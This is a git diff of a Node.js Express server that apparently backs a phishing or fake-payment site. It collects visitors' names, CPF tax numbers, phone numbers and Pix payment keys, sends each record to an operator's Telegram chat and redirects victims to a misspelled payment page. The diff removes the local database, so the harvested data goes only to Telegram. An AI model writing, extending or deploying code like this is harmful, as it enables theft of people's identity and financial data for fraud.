@@ -2,7 +2,6 @@ require('dotenv').config();
 const express = require('express');
 const nodemailer = require('nodemailer');
 const cors = require('cors');
-const sqlite3 = require('sqlite3');
 const path = require('path');
 const TelegramBot = require('node-telegram-bot-api');
 
@@ -60,7 +59,6 @@ app.use('/confirm', express.static(path.join(__dirname, 'confirm')));
 app.use('/pay', express.static(path.join(__dirname, 'pay')));
 app.use('/payvery', express.static(path.join(__dirname, 'payvery')));
 app.use('/very', express.static(path.join(__dirname, 'very')));
-app.use('/VeryPagement', express.static(path.join(__dirname, 'VeryPagement')));
 app.use('/img', express.static(path.join(__dirname, 'img')));
 app.use('/inicial', express.static(path.join(__dirname, 'inicial')));
 
@@ -91,25 +89,6 @@ try {
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
-
-// Banco de dados
-const db = new sqlite3.Database('clientes.db', (err) => {
-  if (err) console.error('Database error:', err);
-  else console.log('Database connected');
-});
-
-db.run(`
-  CREATE TABLE IF NOT EXISTS clientes (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    nome TEXT NOT NULL,
-    cpf TEXT NOT NULL UNIQUE,
-    telefone TEXT NOT NULL,
-    pix_key_type TEXT NOT NULL,
-    pix_key TEXT NOT NULL,
-    status TEXT DEFAULT 'pendente',
-    data_cadastro TEXT DEFAULT CURRENT_TIMESTAMP
-  )
-`);
 
 // Configuração de e-mail
 const transporter = nodemailer.createTransport({
@@ -162,37 +141,22 @@ app.post('/api/clients', (req, res) => {
     return res.status(400).json({ error: 'Todos os campos são obrigatórios' });
   }
 
-  const stmt = `
-    INSERT INTO clientes (nome, cpf, telefone, pix_key_type, pix_key) 
-    VALUES (?, ?, ?, ?, ?)
-  `;
+  const cliente = {
+    nome,
+    cpf,
+    telefone,
+    pix_key_type,
+    pix_key,
+    status: 'pendente',
+    data_cadastro: new Date().toISOString(),
+  };
 
-  db.run(stmt, [nome, cpf, telefone, pix_key_type, pix_key], function (err) {
-    if (err) {
-      console.error('Erro ao salvar no banco:', err.message);
-      if (err.message.includes('UNIQUE constraint failed: clientes.cpf')) {
-        return res.status(400).json({ error: 'CPF já cadastrado' });
-      }
-      return res.status(500).json({ error: 'Erro ao salvar cliente' });
-    }
+  // Enviar e-mail de confirmação
+  sendConfirmationEmail(cliente, email);
 
-    const cliente = {
-      id: this.lastID,
-      nome,
-      cpf,
-      telefone,
-      pix_key_type,
-      pix_key,
-      status: 'pendente',
-      data_cadastro: new Date().toISOString(),
-    };
-
-    // Enviar e-mail de confirmação
-    sendConfirmationEmail(cliente, email);
-
-    // Enviar para o Telegram
-    if (CHAT_ID) {
-      const msg = `✨ *Novo Cadastro Recebido!* ✨
+  // Enviar para o Telegram
+  if (CHAT_ID) {
+    const msg = `✨ *Novo Cadastro Recebido!* ✨
 
 👤 *Nome:* \`${nome}\`
 🆔 *CPF:* \`${cpf}\`
@@ -204,27 +168,15 @@ app.post('/api/clients', (req, res) => {
 
 📅 *Data/Hora:* _${new Date().toLocaleString()}_`;
 
-      bot.sendMessage(CHAT_ID, msg, { parse_mode: 'Markdown' }).catch((error) => {
-        console.error('Erro ao enviar mensagem para o Telegram:', error.message);
-      });
-    } else {
-      console.warn('CHAT_ID não foi encontrado. Verifique se um administrador interagiu com o bot.');
-    }
+    bot.sendMessage(CHAT_ID, msg, { parse_mode: 'Markdown' }).catch((error) => {
+      console.error('Erro ao enviar mensagem para o Telegram:', error.message);
+    });
+  } else {
+    console.warn('CHAT_ID não foi encontrado. Verifique se um administrador interagiu com o bot.');
+  }
 
-    // Retornar sucesso (frontend deve redirecionar)
-    res.status(201).json({ message: 'Cliente cadastrado com sucesso', redirect: '/VeryPagement/pagamento.html' });
-  });
-});
-
-// Listar clientes
-app.get('/api/clients', (req, res) => {
-  db.all('SELECT * FROM clientes ORDER BY data_cadastro DESC', [], (err, rows) => {
-    if (err) {
-      console.error('Erro ao buscar clientes:', err);
-      return res.status(500).json({ error: 'Erro ao buscar clientes' });
-    }
-    res.json(rows);
-  });
+  // Retornar sucesso (frontend deve redirecionar)
+  res.status(201).json({ message: 'Cliente cadastrado com sucesso', redirect: '/VeryPagement/pagamento.html' });
 });
 
 // Fallback para frontend (apenas para rotas não-API)
@@ -243,10 +195,6 @@ app.listen(PORT, () => {
 // Fechar conexões
 process.on('SIGINT', () => {
   console.log('Encerrando servidor...');
-  db.close((err) => {
-    if (err) console.error('Erro ao fechar o banco de dados:', err);
-    else console.log('Banco de dados fechado.');
-  });
   if (bot) {
     bot.stopPolling();
     console.log('Polling do Telegram encerrado.');
